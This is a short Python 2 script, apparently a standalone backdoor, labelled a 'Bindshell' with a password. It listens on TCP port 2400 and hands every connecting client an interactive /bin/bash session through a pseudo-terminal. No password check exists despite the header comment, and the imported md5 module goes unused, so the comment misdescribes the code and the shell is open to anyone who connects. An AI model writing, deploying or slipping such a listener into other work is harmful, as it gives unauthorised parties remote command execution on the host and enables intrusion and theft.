#!/usr/bin/env python
# A Python Bindshell, with a "password'
import md5,os,sys,select
import pty

#from socket import *
import socket

watch = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
watch.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
watch.bind(('',2400))
watch.listen(5)

while True:
    sock, remote = watch.accept()

    if os.fork():
        continue

    pid, childID = pty.fork()

    if pid == 0:
        pty.spawn('/bin/bash')
    else:
        b = sock.makefile(os.O_RDONLY | os.O_NONBLOCK)
        c = os.fdopen(childID, 'r+')
        data = ''
        x = { b:c, c:b }

        while True:
            for f in select.select([b,c],[],[])[0]:
                try:
                    d = os.read(f.fileno(), 4096)
                except:
                    sys.exit(0)

                if f is c and d.strip() == data:
                    data = ''
                    continue

                x[f].write(d)
                x[f].flush()
                data = d.strip()

    sock.close()
